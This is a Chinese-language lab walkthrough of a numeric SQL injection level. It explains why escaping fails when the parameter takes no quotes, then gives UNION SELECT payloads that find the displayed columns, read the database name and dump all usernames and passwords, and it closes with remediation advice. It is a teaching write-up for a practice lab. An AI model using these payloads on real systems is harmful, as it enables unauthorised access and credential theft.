## 一、靶场信息
- **漏洞类型**：数字型 SQL 注入。
- **防御机制**：页面提示存在转义（`escaped as`），但由于是数字型注入，无需引号闭合，转义函数形同虚设。
- **通关思路**：直接利用 `-1` 让原查询落空，使用 `UNION SELECT` 进行联合查询。

## 二、核心绕过思路（大白话解析）

这关是个非常经典的“障眼法”。页面底部写着 `Hint: The Query String you input is escaped as :`，让你以为这又是宽字节注入。但你看顶部提示：`numeric value`（数字型）。

在数字型注入里，后台的 SQL 语句大概是 `WHERE id = -1`，**数字外面根本没有引号**。既然没有引号，后台的转义函数（加反斜杠）也就成了摆设。咱们直接输入纯数字和 SQL 语句，就能长驱直入。

## 三、详细操作步骤与 Payload 解析

### 第一步：探测回显点

**Payload：**
```text
?id=-1 union select 1,2,3 --+
```

**回显现象：**
页面显示数字 `2` 和 `3`，确认存在 3 列回显。

**大白话解析：**
*   **`-1`**：让原查询查个空，把位置腾出来。因为是数字型，`-1` 后面不需要任何单引号。
*   **`union select 1,2,3`**：经典的联合查询测试，强行让数据库多返回三列。
*   **`--+`**：注释符，把后台原本跟着的 `LIMIT 0,1` 注释掉。

### 第二步：爆当前数据库名

**Payload：**
```text
?id=-1 union select 1,database(),3 --+
```

**回显现象：**
页面 `Your Login name:` 后面显示 `security`。

**大白话解析：**
*   利用第 2 列回显位，把数字 `2` 替换成 `database()` 函数，直接把库名喊出来。

### 第三步：终极脱库（提取账号密码）

**Payload：**
```text
?id=-1 union select 1,group_concat(username,0x3a,password),3 from users --+
```

**回显现象：**
页面成功爆出所有账号密码，如 `Dumb:Dumb,Angelina...`。

**大白话解析：**
*   利用 `group_concat` 把 `users` 表里的账号和密码用冒号（`0x3a`）打包成一行，全部塞进第 2 列回显位。

## 四、核心防御机制（Remediation）
- **强制类型转换**：对于数字型参数，服务端必须使用 `intval()` 强制转换为整数，直接杜绝数字型注入。
- **预编译语句（PDO/MySQLi）**：参数化查询，彻底隔离代码与数据。
